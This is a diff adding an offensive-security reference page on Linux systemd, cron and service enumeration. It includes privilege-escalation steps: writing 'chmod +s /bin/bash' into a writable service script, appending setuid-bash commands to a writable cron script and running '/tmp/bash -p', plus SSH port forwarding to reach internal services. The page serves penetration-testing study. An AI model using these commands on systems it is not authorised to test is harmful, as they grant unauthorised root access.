@@ -1,0 +1,96 @@
+---
+title: "System Services"
+description: "Systemd, cron, init, and service management from an offensive perspective."
+---
+
+## Systemd
+
+The primary init system on modern Linux distributions.
+
+```bash
+# List all services
+systemctl list-units --type=service
+systemctl list-units --type=service --state=running
+
+# Service management
+systemctl status sshd
+systemctl start sshd
+systemctl stop sshd
+systemctl restart sshd
+systemctl enable sshd   # start on boot
+
+# Service file locations
+ls /etc/systemd/system/
+ls /lib/systemd/system/
+```
+
+### Service Files (Abuse Vector)
+
+```bash
+# View a service file
+cat /lib/systemd/system/ssh.service
+
+# If a service runs a writable script → overwrite it
+# Example: ExecStart=/opt/startup.sh → writable
+echo "chmod +s /bin/bash" > /opt/startup.sh
+systemctl restart vulnerable-service
+```
+
+## Cron
+
+Scheduled task execution — a classic privesc vector.
+
+```bash
+# View cron jobs
+crontab -l                    # current user
+crontab -l -u root            # root's crontab (if accessible)
+cat /etc/crontab
+ls -la /etc/cron.*
+cat /etc/cron.d/*
+
+# Cron time format
+# MIN HOUR DOM MON DOW CMD
+# *   *    *   *   *   command
+# 0   2    *   *   *   /opt/backup.sh  → runs daily at 2am
+```
+
+### Cron Abuse
+
+```bash
+# If a cron script is writable
+ls -la /opt/backup.sh
+echo "cp /bin/bash /tmp/bash && chmod +s /tmp/bash" >> /opt/backup.sh
+
+# Wait for cron to execute, then:
+/tmp/bash -p
+```
+
+## Common Services to Enumerate
+
+```bash
+# SSH
+cat /etc/ssh/sshd_config
+
+# Apache / Nginx
+cat /etc/apache2/apache2.conf
+ls /etc/apache2/sites-enabled/
+cat /etc/nginx/nginx.conf
+ls /etc/nginx/sites-enabled/
+
+# MySQL
+cat /etc/mysql/my.cnf
+mysql -u root -p
+
+# FTP
+cat /etc/vsftpd.conf
+```
+
+<Tip>
+  Running services that are only listening on localhost (127.0.0.1) may be vulnerable to exploits but not exposed externally — forward the port with SSH to access them from your machine.
+</Tip>
+
+```bash
+# SSH local port forwarding
+ssh -L 8080:127.0.0.1:80 user@target.com
+# Now access the internal service at localhost:8080
+```
